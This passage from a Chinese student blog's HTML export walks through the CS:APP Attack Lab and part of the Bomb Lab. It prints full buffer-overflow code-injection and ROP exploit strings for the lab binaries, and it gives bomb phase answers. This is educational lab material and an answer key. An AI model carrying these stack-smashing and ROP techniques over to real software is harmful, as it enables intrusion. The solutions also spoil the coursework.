class="keyword">void</span> <span class="title">touch1</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  vlevel = <span class="number">1</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Touch1!: You called touch1()\n"</span>);</span><br><span class="line">  validate(<span class="number">1</span>);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>　　如上图，touch1不需要我们传入任何参数，因此我们只需要将返回地址覆盖为touch1的入口地址即可。注意这里是采用小端法。<br>　　注意到，一个函数返回时，对应的汇编语句为 <b>ret</b>，这个时候程序会取出位于栈顶的8个字节的数据，并将其弹出，最后再将PC(program counter)更改为从栈顶取出的那个数据，本质上这其实就是一个control transfer的过程，将控制权从一个函数转移到另一个函数。答案可以为：</p><blockquote><p>61 61 61 61 61<br>61 61 61 61 61<br>61 61 61 61 61<br>61 61 61 61 61<br>61 61 61 61 61<br>61 61 61 61 61<br>61 61 61 61 61<br>61 61 61 61 61<br>c0 17 40 00 00 00 00 00 /* 这一行即为touch1的入口地址。前面的40个字节在函数返回时相当与丢失了。 */</p></blockquote><p>　　将上图中的编码存在某个文件中(这里我存在ctarget1.txt中)，然后使用如下指令即可(注意ctarget和hex2raw应该在当前目录下)：</p><blockquote><p>cat ctarget1.txt | ./hex2raw | ./ctarget -q</p></blockquote><h3 id="Part-I：-level-2"><a href="#Part-I：-level-2" class="headerlink" title="Part I： level 2"></a>Part I： level 2</h3><p>　　有了上一题的基础，我们对实验稍微熟悉一些了。接下来的我们需要进入touch2函数了。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">touch2</span><span class="params">(<span class="keyword">unsigned</span> value)</span> </span>&#123;</span><br><span class="line">  vlevel = <span class="number">2</span>;</span><br><span class="line">  <span class="keyword">if</span> (val == cookie) &#123;</span><br><span class="line">    ...</span><br><span class="line">    validate(<span class="number">2</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    ...</span><br><span class="line">    fail(<span class="number">2</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>　　这个函数需要我们传入一个参数，同时这个参数还要和cookie相等(还记得实验文件中有一个cookie吗？这个cookie就是就是那个文件里面的数字的值)。 由于需要传入参数，没那么好处理了。这个时候我们就需要注入自己的代码了。<br>　　我们需要实现这样的一个指令：</p><blockquote><p>mov $cookie, %rdi // cookie为和每个用户对应的那个数字<br>ret</p></blockquote><p>　　为了获取这个指令的机器级表示，我们可以用gcc将其编译成obj，再用objdump反编译，可以得到对应的机器码。然后，再将其写入txt文件中即可。这里，我的答案是：</p><blockquote><p>bf fa 97 b9 59 /* Set %rdi to cookie*/<br>c3 60 60 60 60 /* transfer control to touch2 */<br>60 60 60 60 60<br>60 60 60 60 60<br>60 60 60 60 60<br>60 60 60 60 60<br>60 60 60 60 60<br>60 60 60 60 60<br>78 dc 61 55 00 00 00 00<br>ec 17 40 00 00 00 00 00</p></blockquote><p>　　%rsp+028并且函数返回之后，PC将指向0x5561dc78，在这里即为bf字节对应的地址。顺利执行完mov语句后，执行c3(ret指令)，PC将指向0x4017ec，这里即为函数touch2的入口地址。继续，使用类似上面的命令将攻击字符串导入，第二题顺利解决。</p><h3 id="Part-I：-level-3"><a href="#Part-I：-level-3" class="headerlink" title="Part I： level 3"></a>Part I： level 3</h3><p>　　和上一题类似，本题需要传入的是一个char指针，即将cookie的那串数字看成字符串。注意，0x不包含在这个字符串当中。同样的，我们可以使用类似上一题的方法，将我们需要的代码和cookie字符串(这里应该查询ASCII码，找到自己的那个串中每个字符对应的数字为多少)注入其中。<br>　　值得注意的是，本题有一个陷阱，当执行touch3的时候，touch3内部执行了hexmatch函数，这里会覆盖掉栈中我们注入的一些数据。但注意到栈是往下生长的，我们只要把cookie字符串放在上面即可。以下为我的答案：</p><blockquote><p>60 60 60 60 60<br>60 60 60 60 60<br>60 60 60 60 60<br>60 60 60 60 60<br>60 60 60 60 60<br>60 60 60 60 60<br>60 60 60 60 60<br>60 60 60 60 60<br>b0 dc 61 55 00 00 00 00　// 覆盖掉原先的返回地址，指向下方我们注入的那个函数<br>fa 18 40 00 00 00 00 00<br>48 c7 c7 c0 dc 61 55 c3  // 这一行将cookie的首地址mov到%rdi上，并返回<br>00 00 00 00 00 00 00 00<br>35 39 62 39 39 37 66 61　// 这一行为我的cookie值</p></blockquote><h3 id="Part-II：-level-2"><a href="#Part-II：-level-2" class="headerlink" title="Part II： level 2"></a>Part II： level 2</h3><p>　　这一道题开始，难度有点加大了。在rtarget文件中，采用了地址空间布局随机化，以及限制栈上的代码无法被执行等方式，使得我们无法采用代码注入对程序进行攻击。这个时候我们需要采用return-oriented programming（ROP）技术来攻击代码。具体如下图。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">setval_210</span><span class="params">(<span class="keyword">unsigned</span> \*p)</span> </span>&#123;</span><br><span class="line">  \*p = <span class="number">3347663060U</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>　　对于上面这个函数，我们看起来好像没有什么特别的。但倘若从机器码的角度来看呢？</p><blockquote><p>400f15: c7 07 d4 48 89 c7 movl $0xc78948d4, (%rdi)<br>400f1b: c3                retq</p></blockquote><p>　　好像还是没有什么特别的。但我们注意到，48，89，c7还可以被理解成另一种意思。如果这个函数是从400f18地址开始的，那么将变成：</p><blockquote><p>400f18: 48 89 c7 movq %rax, %rdi<br>400f1b: c3 retq</p></blockquote><p>　　整个程序的意思完全变了！这就是ROP的特点。利用别人自身的代码攻击别人。只要换了一个位置开始解读，整个程序的结果就会发生很大的变化。我们要做的正是利用这一点来攻击rtarget。为了方便我们的攻击，rtarget中含有很多类似上面这样的容易攻击的函数。从start_farm开始，到end_farm都是我们可以利用来攻击的gadget。<br>　　这个时候我们再来看一下题目的要求。我们需要使用ROP进入touch2中，并且传入正确的cookie。进入touch2还容易，可cookie怎么找？直接找源代码中有没有读应的字节序列吗？这不太可能。注意到还有这个代码popq，对应的编码为0x58~0x5f。怎么用呢？我们实现将cookie注入栈上，然后跳转到某个指令。popq将这个cookie取下，并放在某个寄存器中。然后在将其移动到%rdi。最后再跳转到touch2完成任务。<br>　　以下是我的答案：</p><blockquote><p>60 60 60 60 60<br>60 60 60 60 60<br>60 60 60 60 60<br>60 60 60 60 60<br>60 60 60 60 60<br>60 60 60 60 60<br>60 60 60 60 60<br>60 60 60 60 60<br>ab 19 40 00 00 00 00 00  // 跳转到0x4019ab，实现popq，将cookie取下<br>fa 97 b9 59 00 00 00 00  // 我自己的cookie<br>a2 19 40 00 00 00 00 00  // 跳转到0x4019a2，将cookie移动至%rdi<br>ec 17 40 00 00 00 00 00  // 跳转到0x4017ec，即touch2所在地址</p></blockquote><h3 id="Part-II：-level-3"><a href="#Part-II：-level-3" class="headerlink" title="Part II： level 3"></a>Part II： level 3</h3><p>　　这道题需要实现跳转到touch3中，并且传入char指针，指向我们的cookie字符串。明显有一定难度。官方资料中将我们可能需要用到的指令列出来。如下。<br><img src="/2019/01/15/csapp-Attacklab/1.png" alt="pic"><br>　　由官方所给的提示，我们知道答案应该主要是用mov指令来实现的。注意到mov指令均含有89这个数字，我们可以使用ctrl+f查找有可能被我们用到的gadget。再次，我找到的如下。左边为该实现该指令需要跳转向的地址。<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">4019</span>ab <span class="number">58</span>          pop %rax</span><br><span class="line">       <span class="number">90</span>          nop</span><br><span class="line">       c3          ret</span><br><span class="line"></span><br><span class="line"><span class="number">4019</span>a2 <span class="number">48</span> <span class="number">89</span> c7    mov %rax, %rdi</span><br><span class="line">       c3          ret</span><br><span class="line"></span><br><span class="line"><span class="number">4019</span>dd <span class="number">89</span> c2       mov %eax, %edx</span><br><span class="line">       <span class="number">90</span>          nop</span><br><span class="line">       c3          ret</span><br><span class="line"></span><br><span class="line"><span class="number">401</span>a06 <span class="number">48</span> <span class="number">89</span> e0    mov %rsp, %rax</span><br><span class="line">       c3          ret</span><br><span class="line"></span><br><span class="line"><span class="number">401</span>a69 <span class="number">89</span> d1       mov %edx, %ecx</span><br><span class="line">       <span class="number">08</span> db       orb %bl, %bl</span><br><span class="line">       c3          ret</span><br><span class="line"></span><br><span class="line"><span class="number">401</span>a42 <span class="number">89</span> c2       mov %eax, %edx</span><br><span class="line">       <span class="number">84</span> c0       testb %al, %al</span><br><span class="line">       c3          ret</span><br><span class="line"></span><br><span class="line"><span class="number">401</span>a27 <span class="number">89</span> ce       mov %ecx,%esi</span><br><span class="line">       <span class="number">38</span> c0       cmpb %al, %al</span><br><span class="line">       c3          ret</span><br></pre></td></tr></table></figure></p><p>　　我们如果直接将字符串放在栈当中，但我们又不知到位置，没办法得到对应的指针。因此我们想采用栈顶指针+偏移量的做法。一开始，笔者在这里卡了非常久，一直找不到比较好的办法来解决。直到我看见了farm中有这样一个函数：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">long</span> <span class="title">add_xy</span><span class="params">(<span class="keyword">long</span> x, <span class="keyword">long</span> y)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> x+y;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>　　所以答案，瞬间解决了。按顺序，总共8个gadget，每一个gadget对应的汇编代码如下(ret省去)：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mov %rsp, %rax</span><br><span class="line">mov %rax, %rdi</span><br><span class="line">pop %rax</span><br><span class="line">mov %eax, %edx</span><br><span class="line">mov %edx, %ecx</span><br><span class="line">mov %ecx, %esi</span><br><span class="line">leaq (%rdi, %rsi, <span class="number">1</span>) %rax</span><br><span class="line">mov %rax %rdi</span><br></pre></td></tr></table></figure></p><p>　　以下是我的答案：</p><blockquote><p>60 60 60 60 60<br>60 60 60 60 60<br>60 60 60 60 60<br>60 60 60 60 60<br>60 60 60 60 60<br>60 60 60 60 60<br>60 60 60 60 60<br>60 60 60 60 60<br>06 1a 40 00 00 00 00 00<br>a2 19 40 00 00 00 00 00<br>ab 19 40 00 00 00 00 00<br>48 00 00 00 00 00 00 00<br>dd 19 40 00 00 00 00 00<br>69 1a 40 00 00 00 00 00<br>27 1a 40 00 00 00 00 00<br>d6 19 40 00 00 00 00 00<br>a2 19 40 00 00 00 00 00<br>fa 18 40 00 00 00 00 00<br>35 39 62 39 39 37 66 61<br>00</p></blockquote><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>　　转眼间寒假已经过了好几天了。今天花了接近一天的时间完成了这个实验，以及写下这篇博客。总的来说，虽然做实验的过程很辛苦，但是做完感觉还是很舒服的。虽然我也不知到为什么想要把所有实验的过程都用博客记录下来(这么偏僻的地方应该也没有人会过来看吧)。可能是为了锻炼自己写报告的能力？？？好吧，我也不知道。还是希望自己好好加油，继续坚持写下去吧。这也才仅仅是第三篇而已，还有8篇呢。。<br>　　頑張ってくださいね～！</p>]]></content>
      
      
      <categories>
          
          <category> csapp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> csapp </tag>
            
            <tag> assembly </tag>
            
            <tag> overflow </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>csapp-Bomblab</title>
      <link href="/2019/01/12/csapp-Bomblab/"/>
      <url>/2019/01/12/csapp-Bomblab/</url>
      
        <content type="html"><![CDATA[<h2 id="序"><a href="#序" class="headerlink" title="序"></a>序</h2><p>　　这是csapp系列的第二篇文章。具体的题目请见<a href="http://csapp.cs.cmu.edu/3e/labs.html" target="_blank" rel="noopener">官网</a>。另，本文均为自己手打，可能会有不少错误。如若发现有错误或者哪里写得不清楚，欢迎联系我修改(右下角小图标点开即可对话)。<br>　　这个lab从头到尾都是自己慢慢看过来的，花了很长的时间，也不知道算不算值得吧。个人见解：看反汇编代码是真的很花时间，对着几十行的代码有的时候看了几个小时还是懵的。这个时候还是换一下心情，做点别的事，可能突然就看懂了。但也不要看到代码多就直接放弃了吧，沉下心来看，还是可以看得懂的。</p><h2 id="bomb-lab实验要求"><a href="#bomb-lab实验要求" class="headerlink" title="bomb lab实验要求"></a>bomb lab实验要求</h2><p>　　如同字面上的意思，这个实验要求我们拆一个“炸弹”。总共有六个关卡，需要保证每一个题目的输出结果都能满足某个特定的要求（答案不一定唯一），否则炸弹爆炸，游戏失败。</p><blockquote><p>实验文件：<br>bomb: 炸弹，打开后需要正确输入对应的字符串才能通关<br>bomb.c: bomb的main函数所在的文件，提供给我们进行查看</p><p>实验目的：<br>考察gdb的使用，以及reverse engneering的能力。<br>需要学会使用gdb<a href="https://www.cnblogs.com/kingos/p/4514756.html" target="_blank" rel="noopener">参考网站</a></p></blockquote><p>　　さあ、私たちの実験を始めましょう。<br>　　首先，我们需要先使用<b>objdump -d bomb &gt; bomb.txt</b>这个命令，将bomb反编译，并保存在txt文件当中，方便我们查看。然后，不妨来看一下bomb.c的代码，方便我们对整个实验有一个整体的了解。<br>　　注意看一下注释，上面告诉了我们，可以将已解决的答案放入另一个txt文件当中，运行时用<b>run &lt; answer.txt</b>将其导入，可以不用重复打。然后我们看一下整体，总共有六个字符串，每一个字符串输入后，会判断是否正确，错误则发生爆炸，正确则继续输入。看完之后，就准备进入反编译得到的文件了。　　</p><h3 id="bomb-txt"><a href="#bomb-txt" class="headerlink" title="bomb.txt"></a>bomb.txt</h3><p>　　我们先整体看一下这个文件里面有什么。文件很长，总共有一千多行，不可能每一行都去解读。我们可以利用一些小技巧帮助我们理解。如main函数，我们可以看到它分成如下的几个部分。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">// 读取第一个字符串</span><br><span class="line">  400e32:e8 67 06 00 00       callq  40149e &lt;read_line&gt;</span><br><span class="line">  400e37:48 89 c7             mov    %rax,%rdi</span><br><span class="line">  400e3a:e8 a1 00 00 00       callq  400ee0 &lt;phase_1&gt;</span><br><span class="line">  400e3f:e8 80 07 00 00       callq  4015c4 &lt;phase_defused&gt;</span><br><span class="line">  400e44:bf a8 23 40 00       mov    $0x4023a8,%edi</span><br><span class="line">  400e49:e8 c2 fc ff ff       callq  400b10 &lt;puts@plt&gt;</span><br><span class="line">// 第二个</span><br><span class="line">  400e4e:e8 4b 06 00 00       callq  40149e &lt;read_line&gt;</span><br><span class="line">  400e53:48 89 c7             mov    %rax,%rdi</span><br><span class="line">  400e56:e8 a1 00 00 00       callq  400efc &lt;phase_2&gt;</span><br><span class="line">  400e5b:e8 64 07 00 00       callq  4015c4 &lt;phase_defused&gt;</span><br><span class="line">  400e60:bf ed 22 40 00       mov    $0x4022ed,%edi</span><br><span class="line">  400e65:e8 a6 fc ff ff       callq  400b10 &lt;puts@plt&gt;</span><br><span class="line">// 第三个</span><br><span class="line">  400e6a:e8 2f 06 00 00       callq  40149e &lt;read_line&gt;</span><br><span class="line">  400e6f:48 89 c7             mov    %rax,%rdi</span><br><span class="line">  400e72:e8 cc 00 00 00       callq  400f43 &lt;phase_3&gt;</span><br><span class="line">  400e77:e8 48 07 00 00       callq  4015c4 &lt;phase_defused&gt;</span><br><span class="line">  400e7c:bf 0b 23 40 00       mov    $0x40230b,%edi</span><br><span class="line">  400e81:e8 8a fc ff ff       callq  400b10 &lt;puts@plt&gt;</span><br><span class="line">  ...</span><br></pre></td></tr></table></figure></p><p>　　结合bomb.c，我们应该可以很容易理解main.c的反汇编代码了。接下来，我们再看下其他函数。<br>　　1.strings_not_equal函数。名字很明显告诉了我们，这个函数是判断两个字符串是否相等的。相等则返回0<br>　　2.explode_bomb函数，注意到，其中使用了exit函数。也就是说，这个函数一旦运行，就意味着游戏失败，直接exit退出。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">000000000040143a &lt;explode_bomb&gt;:</span><br><span class="line">  40143a:48 83 ec 08          sub    $0x8,%rsp</span><br><span class="line">  40143e:bf a3 25 40 00       mov    $0x4025a3,%edi</span><br><span class="line">  401443:e8 c8 f6 ff ff       callq  400b10 &lt;puts@plt&gt;</span><br><span class="line">  401448:bf ac 25 40 00       mov    $0x4025ac,%edi</span><br><span class="line">  40144d:e8 be f6 ff ff       callq  400b10 &lt;puts@plt&gt;</span><br><span class="line">  401452:bf 08 00 00 00       mov    $0x8,%edi</span><br><span class="line">  401457:e8 c4 f7 ff ff       callq  400c20 &lt;exit@plt&gt;</span><br></pre></td></tr></table></figure></p><p>　　3.read_line函数。由名字我们也可以知道，这个函数就是为了读取一行字符串。<br>　　4.read_six_numbers函数。由名字，我们知道，这个函数就是用来读六个数字。注意代码中用到了sscanf函数，用于从某一个字符串中格式化读取。其中%rdi存放的是待读取字符串，%rsi存储的是用于格式化的串，后面跟着的都是变量的地址。如sscanf(“7 0”, “%d %d”, &amp;a,  &amp;b)，返回值为成功读取的变量个数。<br>　　5.phase_1 phase_2 … 用于判断输入的字符串是否满足要求</p><h3 id="phase-1"><a href="#phase-1" class="headerlink" title="phase_1"></a>phase_1</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">0000000000400ee0 &lt;phase_1&gt;:</span><br><span class="line">  400ee0:48 83 ec 08          sub    $0x8,%rsp</span><br><span class="line">  400ee4:be 00 24 40 00       mov    $0x402400,%esi</span><br><span class="line">  400ee9:e8 4a 04 00 00       callq  401338 &lt;strings_not_equal&gt; // 直接判断与0x402400位置的字符串是否相同</span><br><span class="line">  400eee:85 c0                test   %eax,%eax</span><br><span class="line">  400ef0:74 05                je     400ef7 &lt;phase_1+0x17&gt;</span><br><span class="line">  400ef2:e8 43 05 00 00       callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">  400ef7:48 83 c4 08          add    $0x8,%rsp</span><br><span class="line">  400efb:c3                   retq</span><br></pre></td></tr></table></figure><p>　　题目很短，难度也很小，就是将读取的字符串直接与首地址为0x402400的字符串作比较，若相同则返回，否则引爆炸弹。因此，我们需要知道0x402400中究竟放着什么字符串。直接从反汇编代码中没办法看出来，这个时候就要用到强大的gdb了。需要用到x命令。语法为: <b>x/&lt;n/f/u&gt; <addr> </addr></b><br>　　其中，n是一个正整数，表示需要显示的内存单元的个数。每个内存单元的大小与u相关。u表示每个单元的大小。f表示输出的格式。较常用的如下。<br>　　x 按十六进制格式输出<br>　　d 按十进制格式输出<br>　　t 按二进制格式输出<br>　　c 按字符格式输出<br>　　如：x/10c 0x402400 将以字符形式输出从0x402400开始的十个字节<br>　　x/10xw 0x402400 将以字符形式输出从0x402400开始的十个单元，每个单元为4个字节<br>　　具体的使用自己试一试就知道了。我们直接查看内存后就发现，对应的字符串为： Border relations with Canada have never been better. 第一题结束。</p><h3 id="phase-2"><a href="#phase-2" class="headerlink" title="phase_2"></a>phase_2</h3><p>　　第二题，长度明显加长了一些。我们可以试着将其分段解读。至于从哪里开始分的话，尽量是选择jmp类的命令所在的行或者jmp命令跳转到的行，这种地方有可能是for循环，或者条件分支语句的结尾。就第二题来说，我们可以将其分成两个部分。第一个部分如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">400efe:48 83 ec 28          sub    $0x28,%rsp                 // 分配40kb的内存空间</span><br><span class="line">400f02:48 89 e6             mov    %rsp,%rsi</span><br><span class="line">400f05:e8 52 05 00 00       callq  40145c &lt;read_six_numbers&gt;  // 将空间传给函数，读取六个数字</span><br><span class="line">400f0a:83 3c 24 01          cmpl   $0x1,(%rsp)                // 判断第一个数字是否为1</span><br><span class="line">400f0e:74 20                je     400f30 &lt;phase_2+0x34&gt;      // 为1，跳开；否则，引爆炸弹</span><br><span class="line">400f10:e8 25 05 00 00       callq  40143a &lt;explode_bomb&gt;</span><br></pre></td></tr></table></figure></p><p>　　第二个部分如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">400f17:8b 43 fc             mov    -0x4(%rbx),%eax</span><br><span class="line">400f1a:01 c0                add    %eax,%eax                   // 取出下一个数字，并*2</span><br><span class="line">400f1c:39 03                cmp    %eax,(%rbx)                 // 判断每一个数字是否为上一个数字的两倍</span><br><span class="line">400f1e:74 05                je     400f25 &lt;phase_2+0x29&gt;       // 是，跳开；不是，爆炸</span><br><span class="line">400f20:e8 15 05 00 00       callq  40143a &lt;explode_bomb&gt;       // 循环体内部，依次判断输入是否正确</span><br><span class="line">400f25:48 83 c3 04          add    $0x4,%rbx</span><br><span class="line">400f29:48 39 eb             cmp    %rbp,%rbx</span><br><span class="line">400f2c:75 e9                jne    400f17 &lt;phase_2+0x1b&gt;</span><br></pre></td></tr></table></figure></p><p>　　于是我们发现，整个程序对我们的要求有三个：<br>　　1.输入六个数字<br>　　2.第一个数字是1<br>　　3.第二个数字开始，每一个数字是前一个的两倍<br>　　由此，我们可以得到结果为：1， 2， 4， 8， 16， 32</p><h3 id="phase-3"><a href="#phase-3" class="headerlink" title="phase_3"></a>phase_3</h3><p>　　第三题，题目又变长了一些。在<b>400f65</b>之前，就是用sscanf读入两个数字。也就是说这次我们需要输入两个满足特定关系的数字。<br>　　再接下来的三行，程序判断输入的第一个数字是否大于小于等于7，否则爆炸。<br>　　接下来一行是重点了。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">400f75:ff 24 c5 70 24 40 00 jmpq   *0x402470(,%rax,8)</span><br></pre></td></tr></table></figure></p><p>　　这个代码是什么意思呢？注意<em>号的作用,该指令跳转的目标点是地址为0x402470+8</em>%rax的内存单元。因此，我们需要打印出来0x402470+8i的值，对照代码后会发现，其实源代码应该就是一个<b>switch</b>函数。再看下接下来的几行代码，基本都是这样的格式：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">400f7c:b8 cf 00 00 00       mov    $0xcf,%eax</span><br><span class="line">400f81:eb 3b                jmp    400fbe &lt;phase_3+0x7b&gt;</span><br></pre></td></tr></table></figure></p><p>　　也就是说，根据你所输入的第一个数，你的第二个数需要对应这跳转目标点mov赋的值。为了简单起见，笔者直接打印0x402470，得到答案。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// b为我们输入的第一个数字，v为我们输入的第二个数字。</span></span><br><span class="line"><span class="keyword">int</span> a;</span><br><span class="line"><span class="keyword">switch</span>(b) &#123;</span><br><span class="line">  <span class="keyword">case</span> <span class="number">0</span>: a = ...</span><br><span class="line">  <span class="keyword">case</span> <span class="number">1</span>: a = ...</span><br><span class="line">  <span class="keyword">case</span> <span class="number">2</span>: a = ...</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (a != v) explode_bomb();</span><br></pre></td></tr></table></figure></p><h3 id="phase-4"><a href="#phase-4" class="headerlink" title="phase_4"></a>phase_4</h3><p>　　这道题看起来难度并不大。前面我们已经做了三道题了，基本上开始能够看懂一些复杂一点点的代码。phase_3函数应该也就不成问题了。首先输入两个数字，第二个数字必须为0，第一个数字将放入func4函数当中。也就是说，我们目的就是看懂func4这个函数在干什么。然后根据函数推断出我们需要输入的第一个数字即可。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">400fd6:89 c1                mov    %eax,%ecx</span><br><span class="line">400fd8:c1 e9 1f             shr    $0x1f,%ecx</span><br><span class="line">400fdb:01 c8                add    %ecx,%eax</span><br><span class="line">400fdd:d1 f8                sar    %eax</span><br></pre></td></tr></table></figure></p><p>　　首先，上面这个部分一开始让我迷惑了很久，这是要干嘛？？其中shr向右移动31位只有两个结果，当%ecx的值大于等于0时，得到结果为0，否则得到-1。因此这几行其实是当%eax的值小于0的时候就减去1。最后再向又移一位（缺省则位移一位）。<br>　　再接下来这段笔者看了特别久，最后是采用尝试着打出源代码才理解的。如果有跟我一样的看不太懂的，也不妨试试这个办法。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">400fdf:8d 0c 30             lea    (%rax,%rsi,1),%ecx</span><br><span class="line">400fe2:39 f9                cmp    %edi,%ecx</span><br><span class="line">400fe4:7e 0c                jle    400ff2 &lt;func4+0x24&gt;</span><br><span class="line">400fe6:8d 51 ff             lea    -0x1(%rcx),%edx</span><br><span class="line">400fe9:e8 e0 ff ff ff       callq  400fce &lt;func4&gt;</span><br><span class="line"></span><br><span class="line">400fee:01 c0                add    %eax,%eax</span><br><span class="line">400ff0:eb 15                jmp    401007 &lt;func4+0x39&gt;</span><br><span class="line"></span><br><span class="line">400ff2:b8 00 00 00 00       mov    $0x0,%eax</span><br><span class="line">400ff7:39 f9                cmp    %edi,%ecx</span><br><span class="line">400ff9:7d 0c                jge    401007 &lt;func4+0x39&gt;</span><br><span class="line"></span><br><span class="line">400ffb:8d 71 01             lea    0x1(%rcx),%esi</span><br><span class="line">400ffe:e8 cb ff ff ff       callq  400fce &lt;func4&gt;</span><br><span class="line">401003:8d 44 00 01          lea    0x1(%rax,%rax,1),%eax</span><br></pre></td></tr></table></figure></p><p>　　如上，将其通过跳转指令划分为4个部分。然后我们发现它调用了自己，也就是说这是一个递归函数。注意到phase_4调用它之前放入了3个参数。我们可以尝试着打出源代码。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// a为我们输入的数，b初始为0，c初始值为15。我们需要返回的值是0。因此，只需要让一开始tt就等于a即可</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">func4</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> b, <span class="keyword">int</span> c)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> t = c-b;</span><br><span class="line">    <span class="keyword">if</span>(t&lt;<span class="number">0</span>) t--;</span><br><span class="line">    t&gt;&gt;=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">int</span> tt=t+b;</span><br><span class="line">    <span class="keyword">if</span>(tt&gt;a) c=tt<span class="number">-1</span>; <span class="keyword">return</span> <span class="number">2</span>*func4(a,b,c);</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (tt==a) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">return</span> <span class="number">2</span>*func4(a,tt+<span class="number">1</span>,c)+<span class="number">1</span>;</span><br><span 